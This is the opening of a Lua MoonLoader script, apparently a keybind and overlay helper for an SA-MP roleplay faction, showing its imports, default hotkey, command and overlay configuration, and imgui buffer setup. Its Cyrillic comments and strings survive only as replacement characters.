script_name('Binder for CO by Belka')
local squadsize = 15.0
local inicfg = require 'inicfg'
local regex = require 'rex_pcre'
local bass = require "lib.bass"
local memory = require 'memory'
local vkeys = require 'vkeys'
local imgui = require 'imgui'
local encoding = require 'encoding'
local ffi = require 'ffi'
local ev = require 'lib.samp.events'
local pie = require 'imgui_piemenu'
local rkeys = require 'rkeys'
local lfs = require 'lfs'
local imgs = require 'images'
local dlstatus = require('moonloader').download_status
imgui.ToggleButton = require('imgui_addons').ToggleButton
encoding.default = 'CP1251'
u8 = encoding.UTF8
local V = 2.22

ffi.cdef[[
int SendMessageA(int, int, int, int);
unsigned int GetModuleHandleA(const char* lpModuleName);
short GetKeyState(int nVirtKey);
bool GetKeyboardLayoutNameA(char* pwszKLID);
int GetLocaleInfoA(int Locale, int LCType, char* lpLCData, int cchData);
]]


----- ��������� ������
local def_ini = {
		HotKey = {
				[1] = "0", [2] = "0", [3] = "0", [4] = "0", [5] = "0", [6] = "0", [7] = "0", [8] = "0", [9] = "0", [10] = "0", -- 1 �����, 2 - ���� ������, 3 ���� ��������, 4 ����������� �������, 5 �������� �������, 6 ���������� �� ���������, 7 ���������� ������������, 8 �������� ����, 9 �������� ������, 10 ���� �����
				[11] = "0", [12] = "0", [13] = "0", [14] = "0", [15] = "0", [16] = "0", [17] = "0", [18] = "0", [19] = "0", [20] = "0", -- 11 �������, 12 �������������, 13 - /lock, 14 - �� ������������, 15 �� ������������, 16 - �� ������������, 17 - �� ������������, 18 - �� ������������, 19 ����� ������ � members, 20 ������� ����� �.,
				[21] = "0", [22] = "0", [23] = "0", [24] = "0", [25] = "0", [26] = "0", [27] = "0", [28] = "0", [29] = "0", [30] = "0", -- 21 ���� ������� � �����, 22 ������� ������ ������, 23 ���� ��������, 24 - �� ������������, 25 ��, 26 ������� �����, 27-30 ���������
				[31] = "0", [32] = "0", [33] = "0", [34] = "0", [35] = "0", [36] = "0", [37] = "0", [38] = "0", [39] = "0", [40] = "0", -- 31-37 ���������, 38-40 - �� ������������
				[41] = "0", [42] = "0", [43] = "0", [44] = "0", [45] = "0", [46] = "0", [47] = "0", [48] = "0", [49] = "0", [50] = "0", -- 41 ������� ������� ��������, 42 ��������� �����, 43 ��������� �������, 44 - piemenu
				[51] = "0", [52] = "0" -- 45-51 - ����� ������, 52 - pie menu ������
		},

		Commands = {
				[1] = "ob", [2] = "sopr", [3] = "zgruz", [4] = "rgruz", [5] = "bgruz", [6] = "kv", [7] = "e", [8] = "", [9] = "r", [10] = "pr",
				[11] = "hey", [12] = "gr", [13] = "hit", [14] = "cl", [15] = "rk", [16] = "memb", [17] = "chs", [18] = "mp", [19] = "z", [20] = "mem1",
				[21] = "sw", [22] = "st", [23] = "", [24] = "", [25] = "afk", [26] = "", [27] = "mcall", [28] = "showp", [29] = ""
		},

		UserBinder = {
				[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = "",
				[11] = "",
		},

		UserCBinder = {
				[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = "",
				[11] = "", [12] = "", [13] = "", [14] = ""
		},

		UserCBinderC = {
				[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = "",
				[11] = "", [12] = "", [13] = "", [14] = ""
		},

		UserPieMenuNames = {[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = ""},

		UserPieMenuActions = {[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = ""},

		UserClist = {
				[1] = "������� �1", [2] = "������� �2", [3] = "������� �3", [4] = "������� �4",
				[5] = "������� �5", [6] = "������� �6", [7] = "������� �7", [8] = "������� �8", [9] = "������� �9",
				[10] = "������� �10", [11] = "������� �11", [12] = "���������� ����� \"�.�.�.�.\"", [13] = "������� �13", [14] = "������� �14",
				[15] = "������� �15", [16] = "������� �16", [17] = "������� �17", [18] = "������� �18", [19] = "������� �19",
				[20] = "������� �20", [21] = "������� �21", [22] = "������� �22", [23] = "������� �23", [24] = "������� �24",
				[25] = "������� �25", [26] = "������� �26", [27] = "������� �27", [28] = "������� �28", [29] = "������� �29",
				[30] = "������� �30", [31] = "������� �31", [32] = "������� �32", [33] = "������� �33"
		},
		
		UserGun = {
			[1] = "����������� �������� \"SD Pistol\"", [2] = "�������� \"Desert Eagle\"", [3] = "�������� \"Shotgun\"", [4] = "��������-������� \"HK MP-5\"",
			[5] = "��������� �������� \"M4A1\"", [6] = "��������� �������� \"AK-47\"", [7] = "����������� �������� \"Country Rifle\""
		},

		bools = {
				[1] = 0, [2] = 0, [3] = 0, [4] = 0, [5] = 0, [6] = 0, [7] = 0, [8] = 0, [9] = 0, [10] = 0, -- 1 �� ������������, 2 - ��������� �������� �� ��, 3 - �������� ����������� � "������� �����", 4 - 10 ����� � ���� ������
				[11] = 0, [12] = 0, [13] = 0, [14] = 0, [15] = 0, [16] = 0, [17] = 0, [18] = 0, [19] = 0, [20] = 0, -- 11 - 14 - ����� � ���� �������, 15 - ������� �� �����, 16-17 �� �����������, 18 ����� ���� � ������, 19 - ����� ��� � ������, 20 - ����� ��� � ������
				[21] = 0, [22] = 0, [23] = 0, [24] = 0, [25] = 0, [26] = 0, [27] = 0, [28] = 0, [29] = 0, [30] = 0, -- 21 - ����� �4 � ������, 22 - ����� ����� � ������, 23 - ����� ������� � ������, 24 - ���������� ������ �� ������, 25 - ��������� overlay, 26 - ���. �����, 27 - ���� ��� � id, 28 - ���� � ���. ����������, 29 - ��, 30 - ���,
				[31] = 0, [32] = 0, [33] = 0, [34] = 0, [35] = 0, [36] = 0, [37] = 0, [38] = 0, [39] = 0, [40] = 0, -- 31 - � �������, 32 - �� � �����, 33 - ��� ����������, 34 - ���� � �����, 35 - ������������, 36 - �� �����, 37 - ���������, 38 - ����� ��������, 39 - ��������� ���� � �����, 40 - �������� ������� �� ���������� ���� � �����
				[41] = 0, [42] = 0, [43] = 0, [44] = 0, [45] = 0, [46] = 0, [47] = 0, [48] = 0, [49] = 0, [50] = 0, -- 41 - ��������� ������, 42 - ������������� ����� � ���������, 43 - �������� +500, 44 - ���������� � ���������� �����, 45 - ����, 46 - �������� � ������� ��, 47 - ���������� ������������, 48 ���������� ����, 49 ��������� �������� ������, 50 - ��������� �������� �����/������, 
				[51] = 0, [52] = 0, [53] = 0, [54] = 0, [55] = 0, [56] = 0, [57] = 0, [58] = 0, [59] = 0, [60] = 0, -- 51 - ��������� ����������� ���������, 52 - ���������� ������� �����, 53 - �������������� �������� �� ���, 54 - ������ ������ � ��������, 55 - /q ��������, 56 - ������������ ������� ���� � ����, 57 - �������������� ��������������, 58 - �������� ������� ����� ������, 59 - ������������, 60 - �������� ������ �� 1-6
				[61] = 0, [62] = 0, [63] = 0, [64] = 0, [65] = 0, [66] = 0, [67] = 0, [68] = 0, [69] = 0, [70] = 0,
				[71] = 0, [72] = 0, [73] = 0, [74] = 0, [75] = 0, [76] = 0, [77] = 0, [78] = 0, [79] = 0, [80] = 0
		},

		rphr = {
				[1] = "", [2] = "", [3] = "", [4] = "", [5] = "", [6] = "", [7] = "", [8] = "", [9] = "", [10] = ""
		},

		warnings = {
				[1] = "", [2] = "", [3] = "", [4] = ""
		},

		ovCoords = {
				["show_timeX"] = 1551, ["show_timeY"] = 18,
				["show_placeX"] = 48, ["show_placeY"] = 796,
				["show_nameX"] = 48, ["show_nameY"] = 1020,
				["show_vehX"] = 1163, ["show_vehY"] = 1024,
				["show_targetImageX"] = 998, ["show_targetImageY"] = 332,
				["show_hpX"] = 1628, ["show_hpY"] = 85,
				["crosCarX"] = 800, ["crosCarY"] = 600,
				["show_rkX"] = 326, ["show_rkY"] = 822,
				["show_afkX"] = 326, ["show_afkY"] = 852,
				["show_tecinfoX"] = 1135, ["show_tecinfoY"] = 668,
				["show_squadX"] = 50, ["show_squadY"] = 500,
				["show_500X"] = 1620, ["show_500Y"] = 780,
				["show_dindX"] = 326, ["show_dindY"] = 952,
				["show_damX"] = 200, ["show_damY"] = 200,
				["show_deathX"] = 326, ["show_deathY"] = 792,
				["show_moneyX"] = 1574, ["show_moneyY"] = 28,
		},

		Settings = {["dinf1"] = 0, ["dinf2"] = 0, ["PlayerRank"] = "", ["PlayerSecondName"] = "", ["UserSex"] = 0, ["PlayerFirstName"] = "", ["PlayerU"] = "�.�.�.�.", ["tag"] = "|| �.�.�.�. ||", ["useclist"] = "12", ["timep"] = "0"},
		
		plus500 = {[1] = "FF00FF", [2] = "54", [3] = "times"},
		
		squadset = {[1] = "FF00FF", [2] = "15", [3] = "arial"},

		fondset = {[1] = "b30000", [2] = "00FF00"},

		dial = {[1] = "10000", [2] = "5000", [3] = "3000", [4] = "3000"},

		day_info = {["today"] = os.date("%a"), ["online"] = 0, ["afk"] = 0, ["full"] = 0 },

		week_info = {["week"] = 1, ["online"] = 0, ["afk"] = 0, ["full"] = 0},

		online = {[0] = 0, [1] = 0, [2] = 0, [3] = 0, [4] = 0, [5] = 0, [6] = 0},
}

local def_ini2 = {
	Settings = {["dinf1"] = 0, ["dinf2"] = 0},
}

local access = {["alevel"] = -1, ["isglory"] = false, ["state"] = -1, ["key"] = "", ["saccess"] = false, ["backup"] = false}
local def_bl = {nicks = {}}
local blarr = inicfg.load(def_bl, "bl")
local config_ini = inicfg.load(def_ini, "config") -- ��������� ���
local dinf_ini = inicfg.load(def_ini2, "dinf.ini") -- ��������� ���

if os.remove("" .. thisScript().directory .. "\\config\\config.ini") == nil then 
	access.backup = true
else
	inicfg.save(config_ini, "config")
end
-- �������� ���������
local PlayerU = config_ini.Settings.PlayerU
local tag = config_ini.Settings.tag
local RP = config_ini.Settings.UserSex == 1 and "a" or ""
local useclist = config_ini.Settings.useclist


----- ����������� ����������
-- ������ �����������
local skipresponse = -1
local pedskol = 0
-- Imgui
local guis = {["mainw"] = imgui.ImBool(false), ["updatestatus"] = {["status"] = imgui.ImBool(false), ["wn"] = {}}}
local maintabs = {
		tab_main_binds = {
				["status"] = true, ["first"] = true, ["clistparams"] = false, ["gunparams"] = imgui.ImBool(false),
		},

		tab_user_binds = {
				["status"] = false, ["hk"] = true, ["cmd"] = false, ["pie"] = false
		},

		tab_bbot = {
				["status"] = false
		},

		tab_commands = {
				["status"] = false, ["first"] = true, ["second"] = false, ["help"] = imgui.ImBool(false), ["money"] = imgui.ImBool(false)
		},

		tab_overlay = {
				["status"] = false
		},

		tab_settings = {
				["status"] = false
		},

		user_keys = {
				["status"] = imgui.ImBool(false)
		},

		rphr = {
				["status"] = imgui.ImBool(false)
		},

		auto_bp = {
				["status"] = imgui.ImBool(false)
		},

		warnings = {
				["status"] = imgui.ImBool(false)
		},
		
		pl500 = {
				["status"] = imgui.ImBool(false)
		},
		
		squad = {
				["status"] = imgui.ImBool(false)
		},

		tab_skipd = {
			["status"] = imgui.ImBool(false)
		},

		tab_weap = {
			["status"] = imgui.ImBool(false)
		},
		
}
local suspendkeys = 2 -- 0 ������ ��������, 1 -- ������ ��������� -- 2 ������ ���������� ��������
local guibuffers = {
		clistparams = {
				["clist1"] = imgui.ImBuffer(u8(config_ini.UserClist[1]), 256), ["clist2"] = imgui.ImBuffer(u8(config_ini.UserClist[2]), 256), ["clist3"] = imgui.ImBuffer(u8(config_ini.UserClist[3]), 256),
				["clist4"] = imgui.ImBuffer(u8(config_ini.UserClist[4]), 256), ["clist5"] = imgui.ImBuffer(u8(config_ini.UserClist[5]), 256), ["clist6"] = imgui.ImBuffer(u8(config_ini.UserClist[6]), 256),
				["clist7"] = imgui.ImBuffer(u8(config_ini.UserClist[7]), 256), ["clist8"] = imgui.ImBuffer(u8(config_ini.UserClist[8]), 256), ["clist9"] = imgui.ImBuffer(u8(config_ini.UserClist[9]), 256),
				["clist10"] = imgui.ImBuffer(u8(config_ini.UserClist[10]), 256), ["clist11"] = imgui.ImBuffer(u8(config_ini.UserClist[11]), 256), ["clist12"] = imgui.ImBuffer(u8(config_ini.UserClist[12]), 256),
				["clist13"] = imgui.ImBuffer(u8(config_ini.UserClist[13]), 256), ["clist14"] = imgui.ImBuffer(u8(config_ini.UserClist[14]), 256), ["clist15"] = imgui.ImBuffer(u8(config_ini.UserClist[15]), 256),
				["clist16"] = imgui.ImBuffer(u8(config_ini.UserClist[16]), 256), ["clist17"] = imgui.ImBuffer(u8(config_ini.UserClist[17]), 256), ["clist18"] = imgui.ImBuffer(u8(config_ini.UserClist[18]), 256),
				["clist19"] = imgui.ImBuffer(u8(config_ini.UserClist[19]), 256), ["clist20"] = imgui.ImBuffer(u8(config_ini.UserClist[20]), 256), ["clist21"] = imgui.ImBuffer(u8(config_ini.UserClist[21]), 256),
				["clist22"] = imgui.ImBuffer(u8(config_ini.UserClist[22]), 256), ["clist23"] = imgui.ImBuffer(u8(config_ini.UserClist[23]), 256), ["clist24"] = imgui.ImBuffer(u8(config_ini.UserClist[24]), 256),
				["clist25"] = imgui.ImBuffer(u8(config_ini.UserClist[25]), 256), ["clist26"] = imgui.ImBuffer(u8(config_ini.UserClist[26]), 256), ["clist27"] = imgui.ImBuffer(u8(config_ini.UserClist[27]), 256),
				["clist28"] = imgui.ImBuffer(u8(config_ini.UserClist[28]), 256), ["clist29"] = imgui.ImBuffer(u8(config_ini.UserClist[29]), 256), ["clist30"] = imgui.ImBuffer(u8(config_ini.UserClist[30]), 256),
				["clist31"] = imgui.ImBuffer(u8(config_ini.UserClist[31]), 256), ["clist32"] = imgui.ImBuffer(u8(config_ini.UserClist[32]), 256), ["clist33"] = imgui.ImBuffer(u8(config_ini.UserClist[33]), 256)
		},
		
		gunparams = {
			["gun1"] = imgui.ImBuffer(u8(config_ini.UserGun[1]), 256), ["gun2"] = imgui.ImBuffer(u8(config_ini.UserGun[2]), 256), ["gun3"] = imgui.ImBuffer(u8(config_ini.UserGun[3]), 256),
			["gun4"] = imgui.ImBuffer(u8(config_ini.UserGun[4]), 256), ["gun5"] = imgui.ImBuffer(u8(config_ini.UserGun[5]), 256), ["gun6"] = imgui.ImBuffer(u8(config_ini.UserGun[6]), 256),
			["gun7"] = imgui.ImBuffer(u8(config_ini.UserGun[7]), 256)
		},

		ubinds = {
				["bind1"] = imgui.ImBuffer(u8(config_ini.UserBinder[1]), 512), ["bind2"] = imgui.ImBuffer(u8(config_ini.UserBinder[2]), 512), ["bind3"] = imgui.ImBuffer(u8(config_ini.UserBinder[3]), 512),
				["bind4"] = imgui.ImBuffer(u8(config_ini.UserBinder[4]), 512), ["bind5"] = imgui.ImBuffer(u8(config_ini.UserBinder[5]), 512), ["bind6"] = imgui.ImBuffer(u8(config_ini.UserBinder[6]), 512),
				["bind7"] = imgui.ImBuffer(u8(config_ini.UserBinder[7]), 512), ["bind8"] = imgui.ImBuffer(u8(config_ini.UserBinder[8]), 512), ["bind9"] = imgui.ImBuffer(u8(config_ini.UserBinder[9]), 512),
				["bind10"] = imgui.ImBuffer(u8(config_ini.UserBinder[10]), 512), ["bind11"] = imgui.ImBuffer(u8(config_ini.UserBinder[11]), 512)
		},

		ucbinds = {
				["bind1"] = imgui.ImBuffer(u8(config_ini.UserCBinder[1]), 512), ["bind2"] = imgui.ImBuffer(u8(config_ini.UserCBinder[2]), 512), ["bind3"] = imgui.ImBuffer(u8(config_ini.UserCBinder[3]), 512),
				["bind4"] = imgui.ImBuffer(u8(config_ini.UserCBinder[4]), 512), ["bind5"] = imgui.ImBuffer(u8(config_ini.UserCBinder[5]), 512), ["bind6"] = imgui.ImBuffer(u8(config_ini.UserCBinder[6]), 512),
				["bind7"] = imgui.ImBuffer(u8(config_ini.UserCBinder[7]), 512), ["bind8"] = imgui.ImBuffer(u8(config_ini.UserCBinder[8]), 512), ["bind9"] = imgui.ImBuffer(u8(config_ini.UserCBinder[9]), 512),
				["bind10"] = imgui.ImBuffer(u8(config_ini.UserCBinder[10]), 512),["bind11"] = imgui.ImBuffer(u8(config_ini.UserCBinder[11]), 512), ["bind12"] = imgui.ImBuffer(u8(config_ini.UserCBinder[12]), 512),
				["bind13"] = imgui.ImBuffer(u8(config_ini.UserCBinder[13]), 512), ["bind14"] = imgui.ImBuffer(u8(config_ini.UserCBinder[14]), 512)
		},

		ucbindsc = {
				["bind1"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[1]), 512), ["bind2"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[2]), 512), ["bind3"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[3]), 512),
				["bind4"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[4]), 512), ["bind5"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[5]), 512), ["bind6"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[6]), 512),
				["bind7"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[7]), 512), ["bind8"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[8]), 512), ["bind9"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[9]), 512),
				["bind10"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[10]), 512), ["bind11"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[11]), 512), ["bind12"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[12]), 512),
				["bind13"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[13]), 512), ["bind14"] = imgui.ImBuffer(u8(config_ini.UserCBinderC[14]), 512)
		},

		rphr = {
				["bind1"] = imgui.ImBuffer(u8(config_ini.rphr[1]), 256), ["bind2"] = imgui.ImBuffer(u8(config_ini.rphr[2]), 256), ["bind3"] = imgui.ImBuffer(u8(config_ini.rphr[3]), 256),
				["bind4"] = imgui.ImBuffer(u8(config_ini.rphr[4]), 256), ["bind5"] = imgui.ImBuffer(u8(config_ini.rphr[5]), 256), ["bind6"] = imgui.ImBuffer(u8(config_ini.rphr[6]), 256),
				["bind7"] = imgui.ImBuffer(u8(config_ini.rphr[7]), 256), ["bind8"] = imgui.ImBuffer(u8(config_ini.rphr[8]), 256), ["bind9"] = imgui.ImBuffer(u8(config_ini.rphr[9]), 256),
				["bind10"] = imgui.ImBuffer(u8(config_ini.rphr[10]), 256)
		},

		settings = {
				["fname"] = imgui.ImBuffer(u8(config_ini.Settings.PlayerFirstName), 256), ["sname"] = imgui.ImBuffer(u8(config_ini.Settings.PlayerSecondName), 256), 
				["rank"] = imgui.ImBuffer(u8(config_ini.Settings.PlayerRank), 256), ["PlayerU"] = imgui.ImBuffer(u8(config_ini.Settings.PlayerU), 256),
				["useclist"] = imgui.ImBuffer(u8(config_ini.Settings.useclist), 256), ["tag"] = imgui.ImBuffer(u8(config_ini.Settings.tag), 256), ["timep"] = imgui.ImBuffer(u8(config_ini.Settings.timep), 256), 
		},

		commands = {
				["command1"] = imgui.ImBuffer(u8(config_ini.Commands[1]), 256), ["command2"] = imgui.ImBuffer(u8(config_ini.Commands[2]), 256), ["command3"] = imgui.ImBuffer(u8(config_ini.Commands[3]), 256),
				["command4"] = imgui.ImBuffer(u8(config_ini.Commands[4]), 256), ["command5"] = imgui.ImBuffer(u8(config_ini.Commands[5]), 256), ["command6"] = imgui.ImBuffer(u8(config_ini.Commands[6]), 256),
				["command7"] = imgui.ImBuffer(u8(config_ini.Commands[7]), 256), ["command8"] = imgui.ImBuffer(u8(config_ini.Commands[8]), 256), ["command9"] = imgui.ImBuffer(u8(config_ini.Commands[9]), 256),
				["command10"] = imgui.ImBuffer(u8(config_ini.Commands[10]), 256), ["command11"] = imgui.ImBuffer(u8(config_ini.Commands[11]), 256), ["command12"] = imgui.ImBuffer(u8(config_ini.Commands[12]), 256),
				["command13"] = imgui.ImBuffer(u8(config_ini.Commands[13]), 256), ["command14"] = imgui.ImBuffer(u8(config_ini.Commands[14]), 256), ["command15"] = imgui.ImBuffer(u8(config_ini.Commands[15]), 256),
				["command16"] = imgui.ImBuffer(u8(config_ini.Commands[16]), 256), ["command17"] = imgui.ImBuffer(u8(config_ini.Commands[17]), 256), ["command18"] = imgui.ImBuffer(u8(config_ini.Commands[18]), 256),
				["command19"] = imgui.ImBuffer(u8(config_ini.Commands[19]), 256), ["command20"] = imgui.ImBuffer(u8(config_ini.Commands[20]), 256), ["command21"] = imgui.ImBuffer(u8(config_ini.Commands[21]), 256),
				["command22"] = imgui.ImBuffer(u8(config_ini.Commands[22]), 256), ["command23"] = imgui.ImBuffer(u8(config_ini.Commands[23]), 256), ["command24"] = imgui.ImBuffer(u8(config_ini.Commands[24]), 256),
				["command25"] = imgui.ImBuffer(u8(config_ini.Commands[25]), 256), ["command26"] = imgui.ImBuffer(u8(config_ini.Commands[26]), 256), ["command27"] = imgui.ImBuffer(u8(config_ini.Commands[27]), 256),
				["command28"] = imgui.ImBuffer(u8(config_ini.Commands[28]), 256), ["command29"] = imgui.ImBuffer(u8(config_ini.Commands[29]), 256)
		},

		warnings = {
			["war1"] = imgui.ImBuffer(u8(config_ini.warnings[1]), 256),
			["war2"] = imgui.ImBuffer(u8(config_ini.warnings[2]), 256),
			["war3"] = imgui.ImBuffer(u8(config_ini.warnings[3]), 256),
			["war4"] = imgui.ImBuffer(u8(config_ini.warnings[4]), 256),
		},

		UserPieMenu = {
				names = {
						["name1"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[1]), 256), ["name2"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[2]), 256), ["name3"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[3]), 256),
						["name4"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[4]), 256), ["name5"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[5]), 256), ["name6"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[6]), 256),
						["name7"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[7]), 256), ["name8"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[8]), 256), ["name9"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[9]), 256),
						["name10"] = imgui.ImBuffer(u8(config_ini.UserPieMenuNames[10]), 256)
				},

				actions = {
						["action1"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[1]), 256), ["action2"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[2]), 256), ["action3"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[3]), 256),
						["action4"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[4]), 256), ["action5"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[5]), 256), ["action6"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[6]), 256),
						["action7"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[7]), 256), ["action8"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[8]), 256), ["action9"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[9]), 256),
						["action10"] = imgui.ImBuffer(u8(config_ini.UserPieMenuActions[10]), 256)
				}
		},
		
		plus500 = {
			["plus500color"] = imgui.ImBuffer(u8(config_ini.plus500[1]), 256), ["plus500size"] = imgui.ImBuffer(u8(config_ini.plus500[2]), 256), ["plus500font"] = imgui.ImBuffer(u8(config_ini.plus500[3]), 256),

		},
		
		squad = {
			["fscolor"] = imgui.ImBuffer(u8(config_ini.squadset[1]), 256), ["size"] = imgui.ImBuffer(u8(config_ini.squadset[2]), 256), ["font"] = imgui.ImBuffer(u8(config_ini.squadset[3]), 256),
		},

		fond = {
			["fondcolor"] = imgui.ImBuffer(u8(config_ini.fondset[1]), 256), ["mycolor"] = imgui.ImBuffer(u8(config_ini.fondset[2]), 256), 
		},

		dial = {
			["med"] = imgui.ImBuffer(u8(config_ini.dial[1]), 256), ["rem"] = imgui.ImBuffer(u8(config_ini.dial[2]), 256), ["meh"] = imgui.ImBuffer(u8(config_ini.dial[3]), 256), ["azs"] = imgui.ImBuffer(u8(config_ini.dial[4]), 256),
		}
}

local togglebools = {
		tab_main_binds = {
				first = {
				
				},

				clistparams = {
						[1] = config_ini.bools[2] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
						[2] = config_ini.bools[3] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				}
		},

		tab_user_binds = {
				hk = {
					[1] = config_ini.bools[4] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[2] = config_ini.bools[5] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[3] = config_ini.bools[6] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[4] = config_ini.bools[7] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[5] = config_ini.bools[8] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[6] = config_ini.bools[9] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[7] = config_ini.bools[10] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[8] = config_ini.bools[11] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[9] = config_ini.bools[12] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[10] = config_ini.bools[13] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
					[11] = config_ini.bools[14] == 1 and imgui.ImBool(true) or imgui.ImBool(false)
				},

				cmd = {

				}
		},

		tab_bbot = {
			[1] = config_ini.bools[39] == 1 and imgui.ImBool(true) or imgui.ImBool(false), 
			[2] = config_ini.bools[40] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[3] = config_ini.bools[42] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[4] = config_ini.bools[55] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[5] = config_ini.bools[56] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[6] = config_ini.bools[15] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[7] = config_ini.bools[57] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[8] = config_ini.bools[59] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[9] = config_ini.bools[60] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
		},

		tab_commands = {

		},

		tab_settings = {
			[1] = config_ini.Settings.UserSex == 1 and imgui.ImBool(true) or imgui.ImBool(false),
		},

		user_keys = {

		},

		rphr = {

		},

		auto_bp = {
				[1] = config_ini.bools[18] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[2] = config_ini.bools[19] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[3] = config_ini.bools[20] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[4] = config_ini.bools[21] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[5] = config_ini.bools[22] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[6] = config_ini.bools[23] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[7] = config_ini.bools[24] == 1 and imgui.ImBool(true) or imgui.ImBool(false)
		},

		tab_overlay = {
				[1] = config_ini.bools[25] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[2] = config_ini.bools[26] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[3] = config_ini.bools[27] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[4] = config_ini.bools[28] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[5] = config_ini.bools[29] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[6] = config_ini.bools[30] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[7] = config_ini.bools[31] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[8] = config_ini.bools[32] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[9] = config_ini.bools[33] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[10] = config_ini.bools[34] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[11] = config_ini.bools[35] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[12] = config_ini.bools[36] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[13] = config_ini.bools[37] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[14] = config_ini.bools[38] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[15] = config_ini.bools[41] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[16] = config_ini.bools[43] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[17] = config_ini.bools[44] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[18] = config_ini.bools[52] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
				[19] = config_ini.bools[54] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
		},

		tab_skipd = {
			[1] = config_ini.bools[45] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[2] = config_ini.bools[46] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[3] = config_ini.bools[47] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[4] = config_ini.bools[48] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[5] = config_ini.bools[49] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[6] = config_ini.bools[50] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[7] = config_ini.bools[51] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
			[8] = config_ini.bools[53] == 1 and imgui.ImBool(true) or imgui.ImBool(false),
		},

		tab_moder = {
			[1] = config_ini.bools[58] == 1 and imgui.ImBool(true) or imgui.ImBool(false)
		},
}
-- �������
-- ���������
local show = {
		show_time = imgui.ImBool(true),
		show_place = imgui.ImBool(true),
		show_name = imgui.ImBool(true),
		show_veh = imgui.ImBool(true),
		show_target = imgui.ImBool(true),
		show_hp = imgui.ImBool(true),
		show_rk = imgui.ImBool(true),
		show_death = imgui.ImBool(true),
		show_tecinfo = imgui.ImBool(true),
